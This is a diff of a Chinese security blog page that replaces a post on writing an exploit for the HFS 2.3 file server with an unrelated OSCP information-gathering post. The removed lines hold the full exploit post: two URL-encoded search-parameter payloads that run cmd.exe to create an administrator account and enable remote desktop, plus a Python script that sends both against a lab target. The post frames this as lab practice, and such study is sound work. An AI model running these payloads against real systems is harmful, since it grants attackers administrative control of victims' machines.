@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安全开发-HFS漏洞利用脚本编写 | Falao&#39;s Blog</title>
+  <title>OSCP-主动式信息收集 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="安全开发-HFS漏洞利用脚本编写 | Falao&#39;s Blog">
+  <meta name="description" content="OSCP-主动式信息收集 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -555,9 +555,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-安全开发-HFS漏洞利用脚本编写" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-OSCP-主动式信息收集" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">安全开发-HFS漏洞利用脚本编写</h1>
+        <h1 class="article-title">OSCP-主动式信息收集</h1>
     
     <div class="article-meta">
         
@@ -567,7 +567,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Python专题">Python专题</a>
+            <a  data-rel="计算机认证">计算机认证</a>
             
         </span>
         
@@ -575,7 +575,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-26 14:31:33'>2021-01-25 16:08</time>
+            Created At : <time class="date" title='Updated At: 2021-02-18 21:11:01'>2021-02-18 21:10</time>
         
     </div>
     <div class="article-meta">
@@ -597,7 +597,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">一：实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%94%BB%E5%87%BB%E5%87%86%E5%A4%87"><span class="toc-text">二：攻击准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91%E6%80%9D%E8%B7%AF"><span class="toc-text">三：脚本开发思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-text">四：漏洞利用脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE"><span class="toc-text">五：实验截图</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -613,61 +613,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="一：实验环境"><a href="#一：实验环境" class="headerlink" title="一：实验环境"></a>一：实验环境</h3><blockquote>
-<p>攻击者IP：192.168.31.20</p>
-<p>靶机IP：192.168.31.244</p>
-<p>攻击者环境：Python3 requests库</p>
-<p>靶机环境：开启HFS~网络文件服务器 2.3Beta</p>
-</blockquote>
-<h3 id="二：攻击准备"><a href="#二：攻击准备" class="headerlink" title="二：攻击准备"></a>二：攻击准备</h3><ul>
-<li>添加用户EXP：</li>
-</ul>
-<pre><code class="yaml">/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D</code></pre>
-<ul>
-<li>开启3389EXP：</li>
-</ul>
-<pre><code class="yaml">/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D</code></pre>
-<h3 id="三：脚本开发思路"><a href="#三：脚本开发思路" class="headerlink" title="三：脚本开发思路"></a>三：脚本开发思路</h3><ol>
-<li>接受输入的漏洞地址</li>
-<li>组合漏洞地址并请求</li>
-<li>判断漏洞是否利用成功</li>
-<li>将利用成功的进行打印</li>
-</ol>
-<h3 id="四：漏洞利用脚本"><a href="#四：漏洞利用脚本" class="headerlink" title="四：漏洞利用脚本"></a>四：漏洞利用脚本</h3><blockquote>
-<pre><code class="python">import requests
-
-url="http://192.168.31.244:8080/"
-
-add_user="/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D"
-open_3389="/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D"
-
-url_adduser=url+add_user
-url_open3389=url+open_3389
-
-def adduser():
-    code=requests.get(url_adduser).status_code
-    if code==200:
-        print("adduser success")
-    else:
-        print("adduser failed")
-
-def open3389():
-    code1=requests.get(url_open3389).status_code
-    if code1==200:
-        print("open3389 success")
-    else:
-        print("open3389 failed")
-
-adduser()
-open3389()</code></pre>
-</blockquote>
-<h3 id="五：实验截图"><a href="#五：实验截图" class="headerlink" title="五：实验截图"></a>五：实验截图</h3><p><img src="https://s3.ax1x.com/2021/01/25/sLjeFf.png" alt="漏洞攻击成功"></p>
-<p><img src="https://s3.ax1x.com/2021/01/25/sLjGT0.md.png" alt="服务端状态"></p>
-<p><img src="https://s3.ax1x.com/2021/01/25/sLjapF.png" alt="最终效果图"></p>
-<ul>
-<li>未完待续…</li>
-</ul>
-
+        
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
     </div>
